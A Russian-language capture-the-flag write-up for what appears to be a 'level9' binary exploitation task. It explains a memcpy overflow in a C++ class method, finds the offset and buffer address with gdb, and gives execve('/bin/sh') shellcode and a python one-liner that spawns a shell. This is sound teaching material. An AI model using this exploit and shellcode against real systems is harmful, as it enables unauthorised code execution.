программа написана на cpp и запускает в методе класса функцию memcpy копируя 
поданный в программу агрумент, что может привести к переполнению
после выполнения метода регистр eax дважды разыменовывается и запускается как функция
мы можем переполнением положить в этот регистр ссылку на ссылку на шелкод,
при подсчете отступа обнаружим, что мы не можем перезаписать непосредственно значение
edx которое затем будет запущено, но можем перезаписать содержимое $esp+16, которое
после двух разыменований станет edx - это происходит потому что переполнение
происходит на аллоцированном пространстве двух созданных объектов классов и мы затираем
первым классом второй, а $esp+16 - как раз таки адрес указателя на объект 2 на стеке:
https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
i r
отсуп равен 108

затем узнаем адрес, куда кладет интересующую нас строку метод класса, мы можем поместить
туда наш шелкод
disas 0x0804870e
b *0x08048733
r with_text
i r
>edx            0x804a00c

так как далее последует еще одно разыменование, мы не можем сразу указывать на наш шел код
требуется сделать еще одну ссылку на следующий участок шелкода : 0x804a00c + 4 = 0x804a010
воспользуемся шелкодом из упражнения lvl2:

шелкод ниже является аналогом данной этой функции и может быть получен через disas /r
 #include <stdio.h>
       main() {
       char *name[2];
       name[0] = "sh";
       name[1] = NULL;
       execve("/bin/sh",name,NULL);
          }
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
его длина 45 символов, итого 45+4+х=108, отступ 59, итак:

./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "U" * 59 + "\x0c\xa0\04\x08"')
$ whoami
bonus0
